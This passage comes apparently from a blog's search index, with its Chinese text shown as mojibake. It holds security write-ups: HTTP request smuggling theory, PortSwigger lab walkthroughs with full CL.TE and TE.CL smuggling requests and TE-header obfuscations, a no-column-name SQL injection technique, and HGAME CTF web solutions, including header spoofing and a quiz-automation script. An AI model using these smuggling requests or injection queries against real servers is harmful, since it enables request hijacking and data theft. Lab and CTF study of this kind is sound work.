æ­¤è¢«è§†ä¸ºç»ˆæ­¢è¯·æ±‚ã€‚æ­¤è¯·æ±‚å°†è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ã€‚ åç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthæ ‡å¤´å¹¶ç¡®å®šè¯·æ±‚ä¸»ä½“é•¿åº¦ä¸º3ä¸ªå­—èŠ‚ï¼Œç›´åˆ°8ä¹‹åçš„è¡Œçš„å¼€å¤´ã€‚ä»¥SMUGGLEDå¼€å¤´çš„ä»¥ä¸‹å­—èŠ‚æœªç»å¤„ç†ï¼Œåç«¯æœåŠ¡å™¨å°†è¿™äº›è§†ä¸ºåºåˆ—ä¸­ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å¤´ã€‚ TE.TE:æ··æ·†TEå¤´ å‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ¨¡ç³Šæ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚ æœ‰å¾ˆå¤šæ··æ·†Transfer-Encodingæ ‡å¤´çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked è¦å‘ç°TE.TEæ¼æ´ï¼Œæœ‰å¿…è¦æ‰¾åˆ°Transfer-Encodingæ ‡å¤´çš„ä¸€äº›å˜ä½“ï¼Œä»¥ä¾¿åªæœ‰ä¸€ä¸ªå‰ç«¯æˆ–åç«¯æœåŠ¡å™¨å¤„ç†å®ƒï¼Œè€Œå¦ä¸€ä¸ªæœåŠ¡å™¨å¿½ç•¥å®ƒï¼Œè½¬è€Œä½¿ç”¨CLï¼Œå°±è·Ÿå‰é¢ä¸¤ç§å¤„ç†æ–¹æ³•åˆ©ç”¨æ–¹å¼ä¸€è‡´äº†ã€‚ æ£€æµ‹è¯·æ±‚èµ°ç§ç›´æ¥ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•ï¼Œé’ˆå¯¹å¤§æµé‡çš„ç›®æ ‡ï¼Œææ˜“å—åˆ°å¹²æ‰°ï¼Œæ”»å‡»å“åº”ä¼šè¢«å…¶ä»–ç”¨æˆ·è·å¾—ï¼Œä»è€Œæ— æ³•å¾—çŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦ä¸€ç§æ–¹å¼ï¼Œä½¿ç”¨ä¸€ç³»åˆ—çš„æ¶ˆæ¯ï¼Œæ¶ˆæ¯è®©åç«¯æŒ‚èµ·å¹¶ä¸”è®©è¿æ¥è¶…æ—¶ã€‚ å¦‚ï¼Œå‘é€ä»¥ä¸‹è¯·æ±‚ 123456789POST &#x2F;about HTTP&#x2F;1.1Host: example.comTransfer-Encoding: chunkedContent-Length: 41ZQ å¯¹äºCL.TEå‹ï¼š å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨CLæ ‡å¤´ï¼Œ4ä¸ªå­—èŠ‚é•¿åº¦åªåŒ…å«åˆ°Zç»“æŸï¼Œå‰ç«¯æœåŠ¡å™¨å°±åªä¼šè½¬å‘åˆ°Zä¸ºæ­¢çš„æ¶ˆæ¯ï¼Œåç«¯ä½¿ç”¨TEå¤´ï¼Œæ£€æµ‹ä¸åˆ°æ¶ˆæ¯ä½“çš„ç»“æŸï¼ˆ0é•¿åº¦çš„å—ï¼‰ï¼Œåœ¨ç­‰å¾…ä¸‹ä¸€ä¸ªå—çš„å¤§å°çš„æ—¶å€™è¶…æ—¶ï¼Œå¯¼è‡´å¯ä»¥è§‚å¯Ÿåˆ°çš„æ—¶é—´å»¶è¿Ÿ TE.TEï¼šè¯·æ±‚ä¼šè¢«å‰ç«¯æœåŠ¡å™¨ç›´æ¥æ‹’ç» CL.CL: è¯·æ±‚ä¼šè¢«ä¸¤ä¸ªæœåŠ¡å™¨ç›´æ¥å¤„ç† TE.CL: æ— æ•ˆçš„å—å¤§å°Q,å‰ç«¯æœåŠ¡å™¨ç›´æ¥æ‹’ç»æ¶ˆæ¯ï¼Œä¸ä¼šè½¬å‘è‡³åç«¯ å†å¦‚ï¼šä½¿ç”¨ä»¥ä¸‹è¯·æ±‚å®‰å…¨åœ°æ£€æµ‹ï¼š 12345678910POST &#x2F;about HTTP&#x2F;1.1Host: example.comTransfer-Encoding: chunkedContent-Length: 60X TE.CL: å‰ç«¯æ£€æµ‹åˆ°æ¶ˆæ¯ä½“ç»“æŸæ ‡å¿—ï¼Œåé¢çš„Xä¸ä¼šè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œä½†æ˜¯åç«¯æœåŠ¡å™¨ä½¿ç”¨CLå¤´ï¼Œåˆ™ä¼šç­‰å¾…Xåˆ°è¾¾ï¼Œè¶…æ—¶ CL.TE: å‰ç«¯æœåŠ¡å™¨å¤¹å¸¦çš„Xä¼šæ„ŸæŸ“åç«¯å¥—æ¥å­—ï¼Œå¯èƒ½ä¼šå½±å“åˆæ³•ç”¨æˆ·çš„è®¿é—®è¯·æ±‚ï¼Œä½†ç”¨ä¸Šä¸€ç§æ–¹æ³•ï¼Œå°±å¯ä»¥æ’é™¤è¿™ç§å½±å“ å‚è€ƒï¼šhttps://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"http smugglings","slug":"http-smugglings","permalink":"https://123-prog.github.io/tags/http-smugglings/"}]},{"title":"WebSecurityAcademyå®éªŒå®¤-Httpè¯·æ±‚èµ°ç§","slug":"Httpè¯·æ±‚èµ°ç§-WebSecurityAcademyå®éªŒå®¤","date":"2021-02-12T09:29:05.000Z","updated":"2021-07-18T14:16:16.728Z","comments":true,"path":"2021/02/12/Httpè¯·æ±‚èµ°ç§-WebSecurityAcademyå®éªŒå®¤/","link":"","permalink":"https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/","excerpt":"0x01 basic CL.TE vulnerabilityå®éªŒæè¿°","text":"0x01 basic CL.TE vulnerabilityå®éªŒæè¿° éœ€è¦å®Œæˆçš„ä»»åŠ¡æ˜¯è®©ä¸‹ä¸€æ¬¡è¯·æ±‚æŠ¥å‡ºGPOSTæ–¹æ³•é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦èµ°ç§ä¸€ä¸ªå¤§å†™å­—æ¯Gï¼Œè¿™æ ·ä¸‹ä¸€æ¬¡è¯·æ±‚å°±ä¸æ˜¯POSTï¼Œè€Œæ˜¯GPOST å‰ç«¯ä»£ç†æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ¶ˆæ¯å¤´æ„é€ å‡ºé•¿åº¦ä¸º0çš„æ¶ˆæ¯å—ï¼Œè¿™æ ·å‰ç«¯æœåŠ¡å™¨ä¼šå°†å…¶å½“ä½œæ˜¯æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šä»¥ä¸ºè¿™é‡Œæ˜¯æ¶ˆæ¯ä½“çš„ç»“æŸä½ç½®ï¼ŒæŠŠåé¢çš„é‚£äº›å†…å®¹å½“ä½œæ˜¯ä¸‹ä¸€æ¬¡è¯·æ±‚çš„å¼€å§‹ 123456789POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 6Transfer-Encoding: chunked0G è¿™é‡Œ0åé¢æ˜¯ä¸¤ä¸ªæ¢è¡Œï¼ˆ/r/n/r/n)ï¼Œ4ä¸ªå­—èŠ‚é•¿åº¦ï¼Œç”¨bpå¾—è®°ä½æŠŠrepeaterçš„è‡ªåŠ¨æ›´æ–°CLå¤´çš„åŠŸèƒ½å…³é—­ æŠŠä¸Šé¢çš„æ„é€ çš„è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ï¼Œå†è¯·æ±‚ä¸€æ¬¡å°±ä¼šå‘ç°æç¤ºé”™è¯¯è¯·æ±‚GPOSTã€‚ ä¸¤æ¬¡è¯·æ±‚å·®ä¸å¤šåƒè¿™æ ·ï¼š 123456789101112POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 6Transfer-Encoding: chunked0GPOST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...... ä¸Šä¸€æ¬¡è¯·æ±‚çš„Gç›´æ¥é™„åœ¨äº†ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ–¹æ³•å¤´éƒ¨ï¼Œè®©POSTæ–¹æ³•å˜æˆäº†GPOST 0x02 basic TE.CL vulnerabilityè¦æ±‚ä¸ç¬¬ä¸€ä¸ªå®éªŒä¸€æ ·ï¼Œåªæ˜¯è¿™é‡Œåå‘ä»£ç†å’Œåç«¯æœåŠ¡å™¨æ‰€ä½¿ç”¨è¯†åˆ«çš„å¤´æ›´æ”¹äº†ï¼Œå‰ç«¯ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œåç«¯ä½¿ç”¨Content-Lengthæ ‡å¤´ å› ä¸ºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨TEå¤´ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶ˆæ¯ä½“ä¸­å°±å¿…é¡»åŒ…å«ä¸€ä¸ªé•¿åº¦ä¸º0çš„å—é—­åˆæ¶ˆæ¯ä½“ï¼Œä¸ºäº†å½±å“ä¸‹ä¸€æ¬¡è¯·æ±‚ï¼Œæ”¹å˜ä¸‹ä¸€æ¬¡è¯·æ±‚æ–¹å¼ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±ä¸ºä¸‹ä¸€æ¬¡è¯·æ±‚æ„é€ ä¸€ä¸ªè¯·æ±‚å¤´ 123456789101112131415POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunked5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10 å‰ç«¯çš„ä»£ç†æœåŠ¡å™¨è¯†åˆ«TEå¤´ï¼Œåˆ™ä¼šæŠŠæ¶ˆæ¯ä½“çœ‹æˆæ˜¯ä¸¤ä¸ªæ¶ˆæ¯å—ï¼Œç¬¬ä¸€ä¸ªé•¿åº¦ä¸º5C,ç¬¬äºŒä¸ªä¸º0ï¼Œç»“æŸçš„æ ‡å¿— åç«¯æœåŠ¡å™¨ä½¿ç”¨CLå¤´ï¼Œç”±äºé•¿åº¦åªæœ‰4,æ‰€ä»¥é™¤äº†5cå’Œä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œä¸‹é¢çš„æ‰€æœ‰æ¶ˆæ¯ä¼šè¢«å½“ä½œæ˜¯ä¸‹ä¸€æ¬¡è¯·æ±‚çš„å¼€å§‹ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æ„é€ å¥½äº†è¯·æ±‚å¤´ï¼ŒæŠŠå®é™…çš„ç¬¬äºŒæ¬¡è¯·æ±‚å½“ä½œäº†æ¶ˆæ¯ä½“çš„ä¸€éƒ¨åˆ†ï¼Œä¸¤æ¬¡è¯·æ±‚å¦‚ï¼š 123456789101112131415161718POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunked5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...... ç¬¬ä¸€æ¬¡è¯·æ±‚åŸæœ¬åº”è¯¥æ˜¯åˆ°0é‚£é‡Œç»“æŸï¼Œä½†æˆ‘ä»¬æ„é€ äº†CLçš„å¤§å°ï¼Œå¯¼è‡´ç¬¬ä¸€æ¬¡è¯·æ±‚åˆ°5cæ¢è¡Œåå°±ç»“æŸäº†ï¼Œåé¢çš„éƒ½æ˜¯ç¬¬äºŒæ¬¡è¯·æ±‚çš„å†…å®¹ï¼Œè€Œç¬¬äºŒæ¬¡è¯·æ±‚åŸæœ¬æ˜¯åœ¨0åé¢å¼€å§‹ ä¸¤æ¬¡è¯·æ±‚çš„ç»“æœ 0x03 obfuscating the TE headerå®éªŒè¦æ±‚ï¼š æ··æ·†TEå¤´ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ–¹æ³•å˜æ›´ä¸ºGPOST æ··æ·†TEå¤´æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå¯ä»¥å¤šè¯•å‡ ç§ 1Transfer-Encoding: xchunked 1Transfer-Encoding : chunked 12Transfer-Encoding: chunkedTransfer-Encoding: x 1Transfer-Encoding:[tab]chunked 1[space]Transfer-Encoding: chunked 1X: X[\\n]Transfer-Encoding: chunked 12Transfer-Encoding: chunked ç»è¿‡å°è¯•ï¼Œç¬¬ä¸‰ç§å¯è¡Œ æ··æ·†ä¹‹åã€‚å¯¹äºå¤´éƒ¨ 12Transfer-Encoding: chunkedTransfer-Encoding: x å‰ç«¯æœåŠ¡å™¨ä¼šè®¤ä¸ºè¿™ä¸ªå°±æ˜¯ä¼ è¾“ç¼–ç çš„æ–¹å¼ï¼Œæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å¤´éƒ¨ï¼Œæ•…å‰ç«¯ä¼šé€‰æ‹©TEå¤´å»ç†è§£æ¶ˆæ¯ä½“ï¼Œåç«¯åˆ™è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæœ‰é—®é¢˜çš„å¤´éƒ¨ï¼Œå¦‚æœæ­¤æ—¶å­˜åœ¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨å°±ä¼šé€‰æ‹©Content-Lengthå»ç†è§£æ¶ˆæ¯ä½“ã€‚è¿™æ ·å°±è·Ÿå‰é¢çš„TE.CLä¸€æ ·äº† è¯·æ±‚å¦‚ä¸‹ 12345678910111213141516POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunkedTransfer-Encoding: x5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10 è¿ç»­ä¸¤æ¬¡è¯·æ±‚å¾—åˆ°â€œUnrecognized method GPOSTâ€","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"http smuggling","slug":"http-smuggling","permalink":"https://123-prog.github.io/tags/http-smuggling/"}]},{"title":"æ— åˆ—åæ³¨å…¥","slug":"æ— åˆ—åæ³¨å…¥","date":"2021-02-10T16:01:16.000Z","updated":"2021-09-22T10:04:33.004Z","comments":true,"path":"2021/02/11/æ— åˆ—åæ³¨å…¥/","link":"","permalink":"https://123-prog.github.io/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","excerpt":"0x01information_schemaæ•°æ®åº“æ˜¯æ³¨å…¥å¸¸ç”¨çš„åº“ï¼Œä½†å¦‚æœè¢«wafè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å…¶ä»–è§†å›¾è¿›è¡Œåˆ©ç”¨","text":"0x01information_schemaæ•°æ®åº“æ˜¯æ³¨å…¥å¸¸ç”¨çš„åº“ï¼Œä½†å¦‚æœè¢«wafè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å…¶ä»–è§†å›¾è¿›è¡Œåˆ©ç”¨ æ¯”å¦‚mysql5.7æ–°å¢çš„sys.schema_auto_increment_columns,sysæ•°æ®åº“ä¸‹çš„ä¸€ä¸ªè®°å½•è‡ªå¢å­—æ®µçš„ä¿¡æ¯çš„è§†å›¾ï¼Œè®°å½•äº†åŒ…æ‹¬è‡ªå¢å­—æ®µçš„è¡¨åï¼Œåº“åç­‰ç­‰ æˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥æŸ¥çš„ä¹Ÿæœ‰ç¼ºé™·ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥åˆ°åˆ—åï¼Œé™¤äº†è‡ªå¢çš„åˆ—åï¼Œå…¶ä»–åˆ—åæ— æ³•é€šè¿‡è¿™ç§æ–¹æ³•æŸ¥å¾—ï¼Œè¿™æ—¶å€™è¦æ³¨å…¥å°±è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥ 0x02å‡å¦‚æœ‰ä¸€ä¸ªæœ‰3ä¸ªå­—æ®µçš„è¡¨t1ï¼Œæˆ‘ä»¬åªçŸ¥é“å…¶ä¸­è‡ªå¢çš„idå­—æ®µï¼Œå…¶ä»–ä¸çŸ¥é“ï¼Œè¿™æ—¶å€™å¯ä»¥åˆ©ç”¨å­æŸ¥è¯¢çš„æ–¹æ³•ï¼Œä¸ç”¨åˆ—åå°±æŸ¥å‡ºè¡¨é‡Œé¢çš„ä¿¡æ¯ï¼Œæœ‰ä¸ªå‰æï¼Œå°±æ˜¯éœ€è¦çŸ¥é“è¡¨çš„å­—æ®µæ•°ï¼Œå½“ç„¶ï¼Œä¸çŸ¥é“ä¹Ÿå¯ä»¥çŒœå˜› é¦–å…ˆï¼Œæˆ‘ä»¬åˆ©ç”¨è”åˆæŸ¥è¯¢å…ˆæŠŠè¡¨ä¸­æ•°æ®æŸ¥å‡º select 1,2,3 union select * from t1; è¿”å›çš„æ•°æ®å¦‚ 123456789+----+----------+------------+| 1 | 2 | 3 |+----+----------+------------+| 1 | 2 | 3 || 1 | flag0 | ssss || 2 | flag1 | ssss || 3 | flag2 | sss || 4 | flag3 | sss |+----+----------+------------+ ç„¶åæŸ¥è¯¢å…¶ä¸­çš„ä¸€åˆ—æ•°æ® select a.1 from (select 1,2,3 union select * from t1)a 123456789+------------+| 1 |+------------+| 1 || 1 || 2 || 3 || 4 |+------------+ 0x03å¯ä»¥ç”¨å¸ƒå°”æ³•ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­æ¯”è¾ƒ è¿™ç§æ–¹æ³•ä¹Ÿå¾—å…ˆçŸ¥é“è¡¨çš„å­—æ®µæ•° å‡å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ªflagè¡¨ï¼Œä¸€ä¸ªidå­—æ®µï¼Œå¦ä¸€ä¸ªå­—æ®µå­˜æ”¾flag select * from flag limit 0,1;å¾—åˆ°æˆ‘ä»¬è¦æŸ¥çš„è¡¨çš„æ•°æ®çš„ç¬¬ä¸€è¡Œ select 1,â€™aâ€™;æ„é€ æ¯”è¾ƒç›®æ ‡ï¼Œç¬¬ä¸€ä¸ª1æ˜¯idå­—æ®µçš„å€¼ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æˆ‘ä»¬è¦æ¯”è¾ƒå¾—å‡ºçš„ç›®æ ‡ è¿›è¡Œæ¯”è¾ƒï¼š 123456mysql&gt; select (select 1,&#39;a&#39;)&gt;(select * from flag limit 0,1)+---------------------------------------------------------+| (select 1,&#39;a&#39;)&gt;(select * from flag limit 0,1) |+---------------------------------------------------------+| 0 |+---------------------------------------------------------+ å¯ä»¥å†™è„šæœ¬è¿›è¡Œæ¯”è¾ƒï¼Œä¹Ÿå¯ä»¥æ— åˆ—åå¾—åˆ°æ•°æ®","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"HGAME week1 webéƒ¨åˆ†","slug":"HGAME-week1-webéƒ¨åˆ†","date":"2021-02-08T12:30:27.000Z","updated":"2021-09-22T10:04:08.653Z","comments":true,"path":"2021/02/08/HGAME-week1-webéƒ¨åˆ†/","link":"","permalink":"https://123-prog.github.io/2021/02/08/HGAME-week1-web%E9%83%A8%E5%88%86/","excerpt":"Hitchhiking_in_the_Galaxy0x01 æ­é¡ºé£è½¦æ‰“å¼€é¢˜ç›®çœ‹è§ï¼Œä½ æ¥æ™šäº†ï¼Œåœ°çƒå·²ç»è¢«æ²ƒè´¡äººæ‘§æ¯äº†ã€‚åŸå› æ˜¯åœ°çƒæŒ¡ä½äº†å®ƒä»¬çš„è¶…ç©ºé—´å¿«é€Ÿé€šé“ã€‚ç‚¹å‡»æ­é¡ºé£è½¦è·³è½¬ï¼Œå‘ç°æœ‰è·³è½¬ç½‘é¡µä½†åˆè·³å›æ¥äº†ï¼Œç”¨bpæŠ“åŒ…ï¼Œå¯ä»¥å¾—åˆ°è·³è½¬é¡µé¢ä¿¡æ¯","text":"Hitchhiking_in_the_Galaxy0x01 æ­é¡ºé£è½¦æ‰“å¼€é¢˜ç›®çœ‹è§ï¼Œä½ æ¥æ™šäº†ï¼Œåœ°çƒå·²ç»è¢«æ²ƒè´¡äººæ‘§æ¯äº†ã€‚åŸå› æ˜¯åœ°çƒæŒ¡ä½äº†å®ƒä»¬çš„è¶…ç©ºé—´å¿«é€Ÿé€šé“ã€‚ç‚¹å‡»æ­é¡ºé£è½¦è·³è½¬ï¼Œå‘ç°æœ‰è·³è½¬ç½‘é¡µä½†åˆè·³å›æ¥äº†ï¼Œç”¨bpæŠ“åŒ…ï¼Œå¯ä»¥å¾—åˆ°è·³è½¬é¡µé¢ä¿¡æ¯ 405è¡¨ç¤ºè¯·æ±‚æ–¹æ³•ä¸å¯¹ï¼Œç”¨å‡ ç§å¸¸è§çš„è¯·æ±‚æ–¹æ³•éƒ½è¯•ä¸€éï¼Œå‘ç°ç”¨POSTæ–¹æ³•å¯ä»¥æˆåŠŸ POSTè¯·æ±‚å¾—åˆ°çš„é¡µé¢æç¤ºç”¨æ— é™éæ¦‚ç‡å¼•æ“è®¿é—®ï¼Œå…¶å®å°±æ˜¯ä¿®æ”¹User-Agentï¼Œä¿®æ”¹ä¸ºInfinite Improbability Drive æ¥ç€å¾—åˆ°å¿…é¡»ä»Cardinalæ¥ï¼Œåˆ™ä¿®æ”¹Refererä¸ºå¯¹åº”url æœ€åå°±æ˜¯è¦æ±‚åœ¨æœ¬åœ°è®¿é—®æ‰èƒ½å¾—åˆ°flagï¼Œç›´æ¥ä¿®æ”¹X-Forwarded-Forä¸º127.0.0.1å³å¯è·å¾—flag watermelon0x01åˆæˆå¤§è¥¿ç“œï¼Œ2000åˆ†æ‹¿flag,è¯•ç€ç©äº†å‡ æ¬¡ï¼Œå‘ç°æ‹¿åˆ°2000åˆ†çœŸçš„éš¾ï¼ˆçœŸçš„æœ‰å¤§ä½¬ç›´æ¥ç©åˆ°2000åˆ†æ‹¿åˆ°flagäº†å—ï¼Ÿ è¿™é“é¢˜åº”è¯¥æ˜¯åœ¨jsæºç ä¸­æ‰¾å¼¹flagçš„å‡½æ•°,éœ€è¦ç”¨åˆ°cocos(ä¸å¤ªäº†è§£)çš„debug toolï¼Œæ‰¾åˆ°ç›¸åº”çš„äº‹ä»¶èŠ‚ç‚¹åç§°ï¼Œæœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ªå‡½æ•°gamwOverShowText æ‹¿å»æ§åˆ¶å°æ‰§è¡Œå¾—åˆ°flag æ™ºå•†æ£€æµ‹é¸¡0x01åˆ†æjsæºç å¯ä»¥å¾—åˆ°ï¼Œè¿™é“é¢˜æ˜¯é€šè¿‡jQueryçš„ajaxå¼‚æ­¥ç½‘ç»œè¯·æ±‚api/ä¸‹çš„å„ç§åŠŸèƒ½ï¼Œè¿”å›jsonæ•°æ®ï¼Œé€šè¿‡å¤„ç†jsonæ•°æ®ä¸åç«¯è¿›è¡Œäº¤äº’ï¼Œè¿™é‡Œæ˜¯ç­”å¯¹100é“é¢˜å¯ä»¥æ‹¿åˆ°flag,å¯¹åº”å‡ ä¸ªapiåŠŸèƒ½ï¼š /api/getStatusï¼šå¾—åˆ°å·²è§£å†³é¢˜ç›®æ•°é‡ 1&#123;&quot;solving&quot;:0&#125; /api/getQuestion: è·å–é—®é¢˜ 1&#123;&quot;question&quot;:&quot;&lt;math&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mo&gt;\\u222b&lt;&#x2F;mo&gt;&lt;mrow&gt;&lt;mo&gt;-&lt;&#x2F;mo&gt;&lt;mn&gt;92&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;mrow&gt;&lt;mn&gt;31&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;&#x2F;msubsup&gt;&lt;mo&gt;(&lt;&#x2F;mo&gt;&lt;mn&gt;12&lt;&#x2F;mn&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mo&gt;+&lt;&#x2F;mo&gt;&lt;mn&gt;17&lt;&#x2F;mn&gt;&lt;mo&gt;)&lt;&#x2F;mo&gt;&lt;mtext&gt;&lt;mi&gt;d&lt;&#x2F;mi&gt;&lt;&#x2F;mtext&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mtd&#x2F;&gt;&lt;&#x2F;mrow&gt;&lt;&#x2F;math&gt;&quot;&#125; /api/getFlagï¼šåœ¨ç¬¦åˆæ¡ä»¶ä¸‹ç»™å‡ºflag 1&#123;&quot;flag&quot;:&quot;\\u9898\\u90fd\\u505a\\u4e0d\\u5b8c\\u8fd8\\u60f3\\u8981Flag?\\u5927\\u5b66\\u751f\\u5c31\\u8fd9\\u5c31\\u8fd9\\u5c31\\u8fd9\\u5c31\\u8fd9\\uff1f&quot;&#125; /api/verify: æ£€éªŒç­”æ¡ˆçš„æ­£ç¡®ä¸å¦ éœ€è¦postä¸€ä¸ªanswerå€¼ï¼Œä»¥jsonæ•°æ®å½¢å¼post æ‰€ä»¥ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥ç”¨è„šæœ¬æ¨¡æ‹Ÿç­”é¢˜çš„æµç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsfrom sympy import*import jsonimport regetQuestionUrl = &quot;http://r4u.top:5000/api/getQuestion&quot;submitUrl = &quot;http://r4u.top:5000/api/verify&quot;getFlagUrl = &quot;http://r4u.top:5000/api/getFlag&quot;headers1 = &#123; &#x27;Cookie&#x27;:&#x27;session=eyJzb2x2aW5nIjowfQ.YBuC-Q.yCqMKTZjGbAT1E2g9qbuyW5RWF0&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.56&#x27; &#125;headers2=&#123; &#x27;Content-Type&#x27;:&#x27;application/json;charset=UTF-8&#x27;, &#x27;Cookie&#x27;:&#x27;session=eyJzb2x2aW5nIjowfQ.YBuC-Q.yCqMKTZjGbAT1E2g9qbuyW5RWF0&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.56&#x27;&#125;for i in range(100): r1 = requests.get(url=getQuestionUrl, headers=headers1) q = r1.json()[&#x27;question&#x27;] #è·å–ç§¯åˆ†é—®é¢˜ pre = re.compile(r&#x27;&gt;(\\d+|-)&lt;&#x27;) #æ­£åˆ™åŒ¹é…è®¡ç®—çš„å€¼ valList = pre.findall(q) print(i) #print(valList) if valList[0]==&#x27;-&#x27;: a = -int(valList[1]) b = int(valList[2]) c = int(valList[3]) d = int(valList[4]) else: a = int(valList[0]) b = int(valList[1]) c = int(valList[2]) d = int(valList[3]) #print(a,b,c,d) x = symbols(&quot;x&quot;) f = c*x+d myAnswer = integrate(f,(x,a,b)) #print(myAnswer) data = &#123; &#x27;answer&#x27;:float(myAnswer) &#125; r2 = requests.post(url=submitUrl,headers=headers2,data=json.dumps(data)) #æäº¤ç­”æ¡ˆ #print(r2.headers) new_cookie = r2.headers[&#x27;Set-Cookie&#x27;] #è·å–ä¸‹ä¸€ä¸ªcookieå€¼ headers1[&#x27;cookie&#x27;] = new_cookie headers2[&#x27;cookie&#x27;] = new_cookie print(r2.text)r3 = requests.get(url=getFlagUrl, headers=headers1)print(r3.text) è„šæœ¬é‡Œæˆ‘ç›´æ¥ç”¨cookie,å› ä¸ºæˆ‘å‘ç°å“åº”å¤´æœ‰ä¸€ä¸ªSet-Cookieï¼Œå…¶å®é¢˜ç›®ç”¨çš„sessionå­˜ç­”å¯¹é¢˜ç›®æ•°é‡ æœ€åæ‹¿åˆ°flag 